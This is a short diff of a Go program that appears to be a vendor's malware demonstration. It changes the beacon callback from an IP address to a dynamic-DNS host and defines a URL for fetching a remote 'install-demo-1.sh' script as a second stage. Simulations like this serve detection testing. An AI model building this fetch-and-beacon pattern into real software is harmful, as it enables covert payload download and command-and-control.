@@ -48,9 +48,9 @@ func main() {
 	// define constants
 	const domain = "lwmalwaredemo.com"
 	const filename = "install-demo-1.sh"
-	const ip = "54.184.116.123"
+	const host = "lacework.ddns.net"
 
-	var post_url = "http://"+ip+"/lw-beacon"
+	var post_url = "http://"+host+"/lw-beacon"
 	var get_url = "http://"+domain+"/"+filename
 	var body = []byte(`{"stage":"2"}`)
 
